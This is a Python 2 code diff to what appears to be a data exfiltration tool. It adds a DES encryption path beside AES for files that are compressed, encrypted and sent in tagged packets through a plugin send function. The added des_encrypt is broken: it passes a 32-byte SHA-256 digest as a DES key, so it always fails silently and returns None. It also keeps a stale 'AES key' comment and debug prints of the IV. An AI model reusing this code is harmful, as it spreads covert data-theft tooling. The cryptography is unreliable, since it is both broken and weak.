@@ -13,7 +13,7 @@ import tempfile
 from random import randint
 from os import listdir
 from os.path import isfile, join
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES,DES
 from zlib import compress, decompress
 
 KEY = ""
@@ -71,6 +71,22 @@ def aes_encrypt(message, key=KEY):
     except:
         return None
 
+def des_encrypt(message, key=KEY):
+    try:
+        # Generate random CBC IV
+        iv = os.urandom(DES.block_size)
+        print iv
+        # Derive AES key from passphrase
+        des = DES.new(hashlib.sha256(key).digest(), DES.MODE_CBC, iv)
+
+        # Add PKCS5 padding
+        pad = lambda s: s + (DES.block_size - len(s) % DES.block_size) * chr(DES.block_size - len(s) % DES.block_size)
+        print pad
+        # Return data size, iv and encrypted message
+        return iv + des.encrypt(pad(message))
+    except:
+        return None
+
 def aes_decrypt(message, key=KEY):
     try:
         # Retrieve CBC IV
@@ -103,6 +119,7 @@ function_mapping = {
     'ok': ok,
     'info': info,
     'aes_encrypt' : aes_encrypt,
+    'des_encrypt' : des_encrypt,
     'aes_decrypt': aes_decrypt
 }
 
@@ -145,6 +162,9 @@ class Exfiltration(object):
 
     def aes_encrypt(self, message):
         return aes_encrypt(message, self.KEY)
+
+    def des_encrypt(self, message):
+        return des_encrypt(message, self.KEY)
 
     def aes_decrypt(self, message):
         return aes_decrypt(message, self.KEY)
@@ -260,6 +280,8 @@ class ExfiltrateFile(threading.Thread):
         if COMPRESSION:
             data = compress(data)
         f.write(aes_encrypt(data, self.exfiltrate.KEY))
+        # print data, self.exfiltrate.KEY
+        # f.write(des_encrypt(data, self.exfiltrate.KEY))
         f.seek(0)
         e.close()
 
@@ -273,7 +295,6 @@ class ExfiltrateFile(threading.Thread):
             # info("Sending %s bytes packet" % len(data_file))
 
             data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
-            print data
             plugin_send_function(data)
             packet_index = packet_index + 1
 
